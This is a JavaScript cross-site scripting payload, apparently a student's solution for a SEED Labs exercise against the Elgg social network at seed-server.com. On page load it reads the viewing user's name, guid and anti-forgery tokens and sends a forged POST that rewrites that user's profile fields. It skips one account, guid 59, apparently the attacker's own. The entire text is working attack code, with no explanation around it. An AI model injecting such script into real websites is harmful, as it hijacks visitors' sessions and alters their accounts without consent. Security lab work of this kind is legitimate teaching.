<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var name=elgg.session.user.name;
	var guid=elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var roll="1905092";
	var rand="ggwp";
	//Construct the content of your url.
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content = token+ts;
	content += '&name='+name;
	content += '&description=%3Cp%3E'+roll+'%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1';
	content += '&briefdescription='+rand+'&accesslevel%5Bbriefdescription%5D=1'
	content += '&location='+rand+'&accesslevel%5Blocation%5D=1'
	content += '&interests='+rand+'&accesslevel%5Binterests%5D=1'
	content += '&skills='+rand+'&accesslevel%5Bskills%5D=1'
	content += '&contactemail='+rand+'%40gmail.com&accesslevel%5Bcontactemail%5D=1';
	content += '&phone='+rand+'&accesslevel%5Bphone%5D=1';
	content += '&mobile='+rand+'&accesslevel%5Bmobile%5D=1';
	content += '&website=http%3A%2F%2Fwww.'+rand+'.com&accesslevel%5Bwebsite%5D=1';
	content += '&twitter='+rand+'&accesslevel%5Btwitter%5D=1';
	content += '&guid='+guid;

	
	if(guid !== 59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
